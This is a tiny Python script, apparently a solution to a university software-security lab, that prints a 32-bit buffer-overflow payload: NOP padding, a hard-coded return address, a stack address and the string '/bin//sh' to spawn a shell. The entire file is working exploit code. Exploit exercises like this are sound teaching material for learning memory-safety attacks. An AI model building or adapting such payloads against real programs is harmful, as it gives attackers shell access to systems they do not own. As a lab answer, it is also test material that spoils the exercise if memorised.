#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x90'*22 + pack('<I', 0x080488b3) + pack('<I', 0xfffefde4) + b'/bin//sh')
